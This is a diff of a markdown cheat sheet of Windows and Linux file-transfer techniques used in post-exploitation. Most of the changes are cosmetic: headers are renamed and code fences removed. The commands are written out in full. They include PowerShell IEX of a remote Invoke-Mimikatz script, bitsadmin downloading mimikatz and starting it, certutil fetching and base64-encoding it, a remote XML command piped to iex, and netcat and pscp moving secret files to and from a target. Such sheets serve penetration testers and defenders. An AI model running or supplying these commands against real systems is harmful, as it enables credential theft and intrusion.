@@ -2,14 +2,14 @@
 
 ## powershell.exe
 
-### powershell proxy auth
-<small>
+### powershell proxy authentication
+
 $Client = New-Object -TypeName System.Net.WebClient
 $Client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
-</small>
 
-### powershell 4.0 & 5.0 Invoke-WebRequest (works in constrained language mode)
+
+### powershell 4.0 / 5.0 Invoke-WebRequest (works in constrained language mode)
 
 Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
 
@@ -70,8 +70,7 @@ $a = New-Object System.Xml.XmlDocument
 $a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
 $a.command.a.execute | iex
 
-
-References:
+Links:
 
 https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 
@@ -80,88 +79,88 @@ https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 
 cmd.exe /c "bitsadmin.exe /transfer downld_job /download /priority high http://www.trustedsite.com C:\Temp\mimikatz.exe & start C:\Temp\mimikatz.exe"
 
-References: 
+Links: 
 
 https://www.greyhathacker.net/?tag=download-and-execute
 
 
 ## ssh / pscp.exe
-```
+
 pscp.exe C:\Users\Public\info.txt phineas@target:/tmp/info.txt
 pscp.exe phineas@target:/home/phineas/secret.txt C:\Users\Public\secret.txt
-```
+
 
 ## certutil.exe
-```
+
 certutil.exe -urlcache -split -f https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1
-```
-References:
+
+Links:
 
 https://twitter.com/subtee/status/888122309852016641?lang=en
 
 
-## certutil.exe / base64
-```
+## certutil.exe base64
+
 certutil.exe -encode mimikatz.exe mimikatz.txt
 certutil.exe -decode mimikatz.txt mimikatz.exe
 
 cat binary.exe | base64 -w 0
 echo {base64_data} | base64 -d > binary.exe
-```
+
 
 ## print.exe
-```
+
 C:\Windows\System32\print.exe /D c:\TEMP\ADExplorer.exe \\live.sysinternals.com\tools\ADExplorer.exe
-```
-References:
+
+Links:
 
 https://twitter.com/Oddvarmoe/status/984749424395112448
 
 
 ## makecab.exe
-```
+
 C:\Windows\System32\makecab.exe \\10.10.10.10\share\nmap.zip C:\Users\Public\nmap.cab
-```
+
 
 ## esentutl.exe
-```
+
 C:\Windows\System32\esentutl.exe /y "\\10.10.10.10\share\mimikatz_trunk.zip" /d"C:\Users\Public\mimikatz_trunk.zip" /o
-```
+
 
 ## extrac32.exe
-```
+
 C:\Windows\System32\extrac32.exe /Y /C \\10.10.10.10\share\secret.txt C:\Users\Public\secret.txt
-```
+
 
 ## netcat
-```
+
 nc -nlvp 8000 > mimi_incoming.exe
 nc -nv 10.10.10.10 8000 </tmp/mimikatz.exe
-```
+
 
 ## web browser / server
-```
+
 python -m SimpleHTTPServer 80
 python3 -m http.server
 ruby -run -ehttpd . -p80
 php -S 0.0.0.0:80
 socat TCP-LISTEN:80,reuseaddr,fork
-```
+
 
 ## wget
-```
+
 wget http://10.10.10.10:80/info.txt -O /tmp/info.txt
-```
+
 
 ## curl
-```
+
 curl -o /tmp/info.txt http://10.10.10.10:80/info.txt
-```
+
 
 ## rdesktop
-```
+
 rdesktop 10.10.10.10 -r disk:linux='/home/user/rdesktop/files'
-```
+
 
 
 
